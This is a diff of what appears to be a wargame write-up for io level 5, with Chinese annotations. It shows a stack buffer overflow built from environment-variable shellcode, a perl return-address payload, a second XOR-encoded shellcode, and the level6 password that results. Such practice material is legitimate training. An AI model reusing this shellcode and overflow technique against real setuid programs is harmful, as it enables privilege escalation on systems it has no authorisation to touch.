@@ -22,20 +22,18 @@ Breakpoint 1, 0x0804841a in main ()
 (gdb) 
 
 成功溢出
-level5@io:/levels$ export PAYLOAD=$'................'
-level5@io:/levels$ cd /tmp/level05
-level5@io:/tmp/level05$ ./getenv1 PAYLOAD
-PAYLOAD is at 0xbfffffbf
-level5@io:/tmp/level05$ cd /levels/
-level5@io:/levels$ ./level05 $(perl -e 'print"A"x(140)."\xbf\xff\xff\xbf"')                                   
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-level6@io:/levels$ cd /home/level6
-level6@io:/home/level6$ ls
-tags
-level6@io:/home/level6$ more .pass
-l1tbXUH2Q/Eotw
-level6@io:/home/level6$   
+level5@io:/levels$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
 
+level5@io:/tmp/level05$ gcc -o getenv1 getenv1.c 
+level5@io:/tmp/level05$ ./getenv1 PAYLOAD
+PAYLOAD is at 0xbfffffaf
+level5@io:/tmp/level05$ cd /levels
+level5@io:/levels$ ./level05 $(perl -e 'print "A"x(140)."\xaf\xff\xff\xbf"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+         level6@io:/levels$ cd /home/level6
+level6@io:/home/level6$ cat .pass
+9BT8fmYDTPimXXhY3m
 
 
 
@@ -135,4 +133,12 @@ Contents of section .ctors:
  8049a84 ffffffff 0f870408 00000000           ............    (0f870408这里存放着initializePRNG的地址
                                                                其地址为0804780f，此处小端机器所以是倒序)
 level5@io:/tmp/level05$ 
+ char shellcode[]="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
 
+r $(perl -e 'print "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x14\x31\xc9\xb1\x22\x80\x32\x7f\x42\xe2\xfa\x15\x4e\x27\xe6\xb2\xff\xf6\xbc\xf6\xbe\x15\x39\x27\xb2\xff\xcf\x74\x2d\x17\x11\x50\x0c\x17\x17\x50\x50\x1d\x16\xf6\x9c\xf6\xae\xb2\xff"')
+
+level5@io:/levels$ ./level05_alt $(perl -e 'print "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x14\x31\xc9\xb1\x22\x80\x32\x7f\x42\xe2\xfa\x15\x4e\x27\xe6\xb2\xff\xf6\xbc\xf6\xbe\x15\x39\x27\xb2\xff\xcf\x74\x2d\x17\x11\x50\x0c\x17\x17\x50\x50\x1d\x16\xf6\x9c\xf6\xae\xb2\xff"')  
+level6@io:/levels$ cd /home/level6
+level6@io:/home/level6$ more .pass
+9BT8fmYDTPimXXhY3m
+level6@io:/home/level6$ 
